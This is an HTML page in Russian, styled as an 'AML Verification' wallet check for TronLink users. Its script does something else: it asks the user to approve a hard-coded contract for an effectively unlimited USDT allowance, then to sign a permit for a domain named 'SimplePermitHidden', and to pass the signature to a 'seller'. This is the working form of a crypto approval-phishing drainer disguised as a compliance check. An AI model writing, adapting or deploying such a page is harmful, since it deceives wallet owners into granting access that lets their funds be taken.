<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AML Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0B0E11; color: #fff; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; gap: 1.5rem; padding: 2rem;
        }
        .logo {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #3375BB 0%, #00D4AA 100%);
            border-radius: 20px; display: flex; align-items: center;
            justify-content: center; font-weight: 800; font-size: 2rem;
        }
        h1 { font-size: 1.5rem; font-weight: 600; }
        .btn {
            padding: 1rem 2rem; border: none; border-radius: 50px;
            font-size: 1rem; font-weight: 600; cursor: pointer;
            color: white; min-width: 250px; text-align: center;
        }
        .btn-primary { background: #3375BB; }
        .btn-success { background: #00D4AA; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { color: #8B949E; font-size: 0.9rem; max-width: 300px; text-align: center; }
        .error { color: #ff4757; }
        .success { color: #00D4AA; }
        .hidden { display: none; }
        .data-box {
            background: #151A21; border: 1px solid #2D333B;
            border-radius: 12px; padding: 1rem; margin-top: 1rem;
            font-family: monospace; font-size: 0.75rem;
            word-break: break-all; max-width: 400px; width: 100%;
        }
        .copy-btn {
            background: #2D333B; border: none; color: #fff;
            padding: 0.5rem 1rem; border-radius: 8px;
            cursor: pointer; font-size: 0.8rem; margin-top: 0.5rem;
        }
    </style>
</head>
<body>

    <div class="logo">AML</div>
    <h1>AML Verification</h1>

    <div id="statusText" class="status">Подключите кошелёк для продолжения</div>

    <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
        Подключить TronLink
    </button>

    <button id="signBtn" class="btn btn-success hidden" onclick="signPermit()">
        Подписать разрешение
    </button>

    <div id="resultBox" class="hidden">
        <div class="data-box" id="signatureData"></div>
        <button class="copy-btn" onclick="copyData()">📋 Копировать данные</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
    <script>
        const CONTRACT = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
        const USDT = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';

        let tronWeb, userAddr, nonce;

        // ABI минимальный
        const USDT_ABI = [
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];

        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Подключение...';

            try {
                // Ждём TronLink
                let attempts = 0;
                while (!window.tronWeb?.defaultAddress?.base58 && attempts < 20) {
                    await new Promise(r => setTimeout(r, 300));
                    attempts++;
                }

                if (!window.tronWeb?.defaultAddress?.base58) {
                    throw new Error('TronLink не найден. Откройте страницу в TronLink браузере.');
                }

                tronWeb = window.tronWeb;
                userAddr = tronWeb.defaultAddress.base58;

                // Проверяем сеть Nile
                const node = await tronWeb.trx.getNodeInfo();
                console.log('Node:', node);

                status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);

                // Проверяем allowance
                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
                const allowance = await usdtContract.allowance(userAddr, CONTRACT).call();

                if (allowance.toNumber() > 0) {
                    // Уже есть approve — показываем подпись
                    btn.classList.add('hidden');
                    document.getElementById('signBtn').classList.remove('hidden');
                    status.textContent = 'Нажмите "Подписать разрешение"';
                } else {
                    // Нужен approve
                    btn.textContent = 'Разрешить доступ к USDT';
                    btn.onclick = doApprove;
                    status.textContent = 'Требуется разрешение на доступ к USDT';
                }

            } catch (e) {
                btn.disabled = false;
                btn.textContent = 'Подключить TronLink';
                status.textContent = 'Ошибка: ' + e.message;
                status.classList.add('error');
                console.error(e);
            }
        }

        async function doApprove() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Ожидание подтверждения...';

            try {
                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
                const max = '999999999999999999999999999999';

                await usdtContract.approve(CONTRACT, max).send({
                    feeLimit: 100000000,
                    callValue: 0
                });

                btn.classList.add('hidden');
                document.getElementById('signBtn').classList.remove('hidden');
                status.textContent = 'Нажмите "Подписать разрешение"';
                status.classList.remove('error');

            } catch (e) {
                btn.disabled = false;
                btn.textContent = 'Разрешить доступ к USDT';
                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
                status.classList.add('error');
            }
        }

        async function signPermit() {
            const btn = document.getElementById('signBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Подпись...';

            try {
                nonce = Math.floor(Math.random() * 1000000);
                const deadline = Math.floor(Date.now() / 1000) + 86400; // 1 день

                // EIP-712 хеш вручную
                const PERMIT_TYPEHASH = tronWeb.sha3(
                    "Permit(address buyer,uint256 nonce,uint256 deadline)"
                );

                // Chain ID Nile
                const chainId = 3448148188;

                // DOMAIN_SEPARATOR
                const domainData = tronWeb.eth.abi.encodeParameters(
                    ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
                    [
                        tronWeb.sha3("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                        tronWeb.sha3("SimplePermitHidden"),
                        tronWeb.sha3("1"),
                        chainId,
                        CONTRACT
                    ]
                );
                const DOMAIN_SEPARATOR = tronWeb.sha3(domainData, { encoding: 'hex' });

                // structHash
                const structData = tronWeb.eth.abi.encodeParameters(
                    ['bytes32', 'address', 'uint256', 'uint256'],
                    [PERMIT_TYPEHASH, userAddr, nonce, deadline]
                );
                const structHash = tronWeb.sha3(structData, { encoding: 'hex' });

                // Final hash
                const finalHash = tronWeb.sha3(
                    '0x1901' + DOMAIN_SEPARATOR.slice(2) + structHash.slice(2),
                    { encoding: 'hex' }
                );

                // Подпись через TronLink
                const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);

                // Parse v, r, s
                const sig = signature.replace('0x', '');
                const v = parseInt(sig.substr(128, 2), 16);
                const r = '0x' + sig.substr(0, 64);
                const s = '0x' + sig.substr(64, 64);

                // Показываем результат
                const data = {
                    buyer: userAddr,
                    nonce: nonce,
                    deadline: deadline,
                    v: v,
                    r: r,
                    s: s
                };

                document.getElementById('signatureData').textContent = JSON.stringify(data, null, 2);
                document.getElementById('resultBox').classList.remove('hidden');

                btn.textContent = '✅ Подписано';
                status.textContent = 'Отправьте данные продавцу';
                status.classList.add('success');

            } catch (e) {
                btn.disabled = false;
                btn.textContent = 'Подписать разрешение';
                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
                status.classList.add('error');
                console.error(e);
            }
        }

        function copyData() {
            const text = document.getElementById('signatureData').textContent;
            navigator.clipboard.writeText(text).then(() => {
                alert('Скопировано!');
            });
        }

        // Auto-connect если уже есть TronWeb
        if (window.tronWeb?.defaultAddress?.base58) {
            connectWallet();
        }
    </script>
</body>
</html>
